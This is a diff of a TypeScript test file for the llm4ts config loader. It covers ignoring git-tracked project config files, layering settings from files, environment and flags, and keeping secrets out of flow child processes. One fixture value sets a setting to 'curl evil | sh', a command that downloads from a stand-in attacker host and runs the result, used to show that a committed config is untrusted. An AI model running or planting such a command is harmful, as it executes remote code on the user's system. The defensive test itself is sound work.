@@ -1,6 +1,14 @@
 import { assert, describe, it } from "@effect/vitest"
 import * as Effect from "effect/Effect"
 import * as Result from "effect/Result"
+import * as Stream from "effect/Stream"
+import { ProviderError } from "@llm4ts/core/Errors"
+import {
+  makeFakeProcessExecutor,
+  makeProcessExecutor,
+  ProcessResult,
+  type ProcessExecutorShape
+} from "@llm4ts/core/ProcessExecutor"
 import { PersistenceError } from "@llm4ts/flow/FlowError"
 import { makeMemoryPlainFileStore, type PlainFileStoreShape } from "@llm4ts/flow/Persistence"
 import type { Environment } from "@llm4ts/flow/Settings"
@@ -9,10 +17,12 @@ import {
   expandPath,
   flowEnvironment,
   globalConfigPath,
+  launchProblems,
   loadConfig,
   missingRequired,
   parseConfigFile,
   planSet,
+  prepareLaunch,
   projectConfigPath,
   registryFacts,
   resolveConfig,
@@ -734,6 +744,246 @@ const failingReads = (store: PlainFileStoreShape, path: string): PlainFileStoreS
       : store.read(candidate)
 })
 
+const lsFiles = JSON.stringify(["git", "ls-files", "--error-unmatch", "--", ".llm4ts/config.env"])
+
+// `git ls-files --error-unmatch` exits 0 for a tracked file, 1 for an
+// untracked one and 128 outside a repository; with no git it cannot spawn.
+const gitAnswering = (exitCode: number | "missing"): ProcessExecutorShape =>
+  makeProcessExecutor({
+    run: (argv) =>
+      exitCode === "missing" || JSON.stringify(argv) !== lsFiles
+        ? Effect.fail(ProviderError.make({ message: "git failed: command not found" }))
+        : Effect.succeed(ProcessResult.make({ stdout: [], exitCode })),
+    runStreaming: () => Stream.empty
+  })
+
+const untracked = gitAnswering(1)
+
+describe("a project file that git tracks", () => {
+  const files = {
+    [projectPath]: "LLM4TS_GATES=curl evil | sh\nLLM4TS_CODER=pi\n",
+    [globalPath]: "LLM4TS_REASONER=claude\n"
+  }
+  const load = (executor: ProcessExecutorShape) =>
+    Effect.gen(function* () {
+      const memory = yield* makeMemoryPlainFileStore(files)
+      return yield* loadConfig({
+        repo,
+        environment: { HOME: home },
+        flags: [],
+        files: memory.store,
+        executor
+      })
+    })
+
+  it.effect("is ignored whole, with a warning that says how to untrack it", () =>
+    Effect.gen(function* () {
+      const loaded = yield* load(gitAnswering(0))
+      assert.isTrue(loaded.projectTracked)
+      assert.isUndefined(loaded.project)
+      assert.deepStrictEqual([...loaded.resolution.settings.keys()], ["LLM4TS_REASONER"])
+      assert.deepStrictEqual(brief(loaded.resolution.problems), ["warning tracked"])
+      assert.strictEqual(
+        loaded.resolution.problems[0]?.message,
+        `${projectPath}: tracked by git, so it is ignored; llm4ts reads only a local project file. Untrack it: git rm --cached .llm4ts/config.env`
+      )
+      assert.deepStrictEqual(launchProblems(loaded.resolution).blocking, [])
+    })
+  )
+
+  for (const [label, executor] of [
+    ["untracked", gitAnswering(1)],
+    ["outside a git repository", gitAnswering(128)],
+    ["with no git installed", gitAnswering("missing")]
+  ] as const) {
+    it.effect(`is read when ${label}`, () =>
+      Effect.gen(function* () {
+        const loaded = yield* load(executor)
+        assert.isFalse(loaded.projectTracked)
+        assert.deepStrictEqual([...loaded.resolution.settings.keys()].sort(), [
+          "LLM4TS_CODER",
+          "LLM4TS_GATES",
+          "LLM4TS_REASONER"
+        ])
+        assert.deepStrictEqual(loaded.resolution.problems, [])
+      })
+    )
+  }
+
+  it.effect("git is not asked when there is no project file", () =>
+    Effect.gen(function* () {
+      const memory = yield* makeMemoryPlainFileStore()
+      const fake = yield* makeFakeProcessExecutor()
+      yield* loadConfig({
+        repo,
+        environment: { HOME: home },
+        flags: [],
+        files: memory.store,
+        executor: fake.executor
+      })
+      assert.deepStrictEqual(yield* fake.recorded, [])
+    })
+  )
+})
+
+describe("prepareLaunch", () => {
+  const launch = (options: {
+    readonly flow: string
+    readonly files?: Readonly<Record<string, string>>
+    readonly base?: Environment
+    readonly flags?: ReadonlyArray<FlagAssignment>
+  }) =>
+    Effect.gen(function* () {
+      const memory = yield* makeMemoryPlainFileStore(options.files ?? {})
+      return yield* prepareLaunch({
+        repo,
+        flow: options.flow,
+        base: { HOME: home, ...options.base },
+        flags: options.flags ?? [],
+        files: memory.store,
+        executor: untracked
+      })
+    })
+
+  it.effect("a file value reaches the child, an export wins over it, a flag over both", () =>
+    Effect.gen(function* () {
+      const plan = yield* launch({
+        flow: "implement",
+        files: {
+          [globalPath]: "LLM4TS_VERBOSITY=verbose\nLLM4TS_CODER=pi\n",
+          [projectPath]: "LLM4TS_JUDGE_ROUNDS=1\nLLM4TS_ISOLATED=on\nLLM4TS_PACK=from-file\n"
+        },
+        base: { LLM4TS_VERBOSITY: "quiet", LLM4TS_PACK: "exported", PATH: "/usr/bin" },
+        flags: [set("LLM4TS_PACK", "flagged", "--pack")]
+      })
+      assert.deepStrictEqual(
+        { ...plan.environment },
+        {
+          HOME: home,
+          PATH: "/usr/bin",
+          LLM4TS_VERBOSITY: "quiet",
+          LLM4TS_CODER: "pi",
+          LLM4TS_JUDGE_ROUNDS: "1",
+          LLM4TS_ISOLATED: "1",
+          LLM4TS_PACK: "flagged",
+          LLM4TS_FLOW: "implement"
+        }
+      )
+      assert.deepStrictEqual(plan.notices, [
+        `note: LLM4TS_VERBOSITY from the environment overrides ${globalPath}:1`
+      ])
+    })
+  )
+
+  it.effect("a shellOnly secret never reaches a flow child", () =>
+    Effect.gen(function* () {
+      const plan = yield* launch({
+        flow: "implement",
+        base: { LLM4TS_MCP_TOKEN: "s3cret", LLM4TS_GEMINI_BRIDGE_TOKEN: "t0ken" }
+      })
+      assert.isFalse("LLM4TS_MCP_TOKEN" in plan.environment)
+      assert.strictEqual(plan.environment.LLM4TS_GEMINI_BRIDGE_TOKEN, "t0ken")
+    })
+  )
+
+  it.effect("warns about a misspelled export only when a setting is close", () =>
+    Effect.gen(function* () {
+      const plan = yield* launch({
+        flow: "implement",
+        base: {
+          LLM4TS_VERBOSTY: "verbose",
+          LLM4TS_MY_OWN_FLOW_KNOB: "1",
+          LLM4TS_STALL_MINUTES: "soon"
+        }
+      })
+      assert.deepStrictEqual(plan.notices, [
+        "warning: the environment: LLM4TS_STALL_MINUTES must be a positive number of minutes",
+        "warning: the environment: unknown setting LLM4TS_VERBOSTY; did you mean LLM4TS_VERBOSITY?"
+      ])
+      assert.strictEqual(plan.environment.LLM4TS_VERBOSTY, "verbose")
+    })
+  )
+
+  for (const [label, flags, message] of [
+    [
+      "an unknown --set name",
+      [set("LLM4TS_VERBOSTY", "verbose")],
+      "--set: unknown setting LLM4TS_VERBOSTY; did you mean LLM4TS_VERBOSITY?"
+    ],
+    [
+      "an unreadable --set value",
+      [set("LLM4TS_JUDGE_ROUNDS", "one")],
+      "--set: LLM4TS_JUDGE_ROUNDS must be a positive integer"
+    ],
+    [
+      "a secret from a flag",
+      [set("LLM4TS_MCP_TOKEN", "s3cret")],
+      "--set: LLM4TS_MCP_TOKEN is a secret: export it in the environment"
+    ],
+    [
+      "a setting named by a flag and by --set",
+      [set("LLM4TS_PACK", "a", "--pack"), set("LLM4TS_PACK", "b")],
+      "LLM4TS_PACK is set by --pack and --set; use one"
+    ]
+  ] as const) {
+    it.effect(`refuses ${label}`, () =>
+      Effect.gen(function* () {
+        const error = yield* Effect.flip(launch({ flow: "implement", flags }))
+        assert.strictEqual(error._tag, "ShellUsage")
+        assert.strictEqual(error.message, message)
+      })
+    )
+  }
+
+  it.effect("refuses a malformed file line and an unreadable file value", () =>
+    Effect.gen(function* () {
+      const error = yield* Effect.flip(
+        launch({
+          flow: "implement",
+          files: { [projectPath]: "oops\nLLM4TS_JUDGE_ROUNDS=one\n" }
+        })
+      )
+      assert.strictEqual(
+        error.message,
+        [
+          `${projectPath}:1: not a NAME=value line`,
+          `${projectPath}:2: LLM4TS_JUDGE_ROUNDS must be a positive integer`
+        ].join("\n")
+      )
+    })
+  )
+
+  it.effect("refuses a flow whose required setting no layer sets, with both ways to set it", () =>
+    Effect.gen(function* () {
+      const error = yield* Effect.flip(launch({ flow: "pack-fork" }))
+      const doc = (name: "LLM4TS_TARGET_KIND" | "LLM4TS_FORK_AS") =>
+        registryFacts.find((fact) => fact.name === name)?.doc ?? ""
+      assert.strictEqual(
+        error.message,
+        [
+          `pack-fork needs LLM4TS_TARGET_KIND: ${doc("LLM4TS_TARGET_KIND")}`,
+          `  for this repository:  llm4ts config set --repo ${repo} LLM4TS_TARGET_KIND=<value>`,
+          "  for this run only:    llm4ts run pack-fork --set LLM4TS_TARGET_KIND=<value>",
+          `pack-fork needs LLM4TS_FORK_AS: ${doc("LLM4TS_FORK_AS")}`,
+          `  for this repository:  llm4ts config set --repo ${repo} LLM4TS_FORK_AS=<value>`,
+          "  for this run only:    llm4ts run pack-fork --set LLM4TS_FORK_AS=<value>"
+        ].join("\n")
+      )
+    })
+  )
+
+  it.effect("a required setting from any layer lets the flow start", () =>
+    Effect.gen(function* () {
+      const plan = yield* launch({
+        flow: "convert-page",
+        files: { [projectPath]: "LLM4TS_LEGACY_REPO=../legacy\n" }
+      })
+      assert.strictEqual(plan.environment.LLM4TS_LEGACY_REPO, "/work/legacy")
+      assert.strictEqual(plan.environment.LLM4TS_FLOW, "convert-page")
+    })
+  )
+})
+
 describe("loadConfig", () => {
   it.effect("absent files are no problem", () =>
     Effect.gen(function* () {
@@ -742,7 +992,8 @@ describe("loadConfig", () => {
         repo,
         environment: { HOME: home, LLM4TS_CODER: "pi" },
         flags: [],
-        files: memory.store
+        files: memory.store,
+        executor: untracked
       })
       assert.isUndefined(loaded.project)
       assert.isUndefined(loaded.global)
@@ -762,7 +1013,8 @@ describe("loadConfig", () => {
         repo,
         environment: { HOME: home, XDG_CONFIG_HOME: "/xdg" },
         flags: [set("LLM4TS_REASONER", "gemini")],
-        files: memory.store
+        files: memory.store,
+        executor: untracked
       })
       const value = (name: "LLM4TS_CODER" | "LLM4TS_REASONER" | "LLM4TS_LEGACY_REPO") =>
         loaded.resolution.settings.get(name)?.raw
@@ -789,7 +1041,8 @@ describe("loadConfig", () => {
           repo,
           environment: { HOME: home },
           flags: [],
-          files: failingReads(memory.store, projectPath)
+          files: failingReads(memory.store, projectPath),
+          executor: untracked
         })
       )
       assert.strictEqual(error._tag, "ConfigFileError")
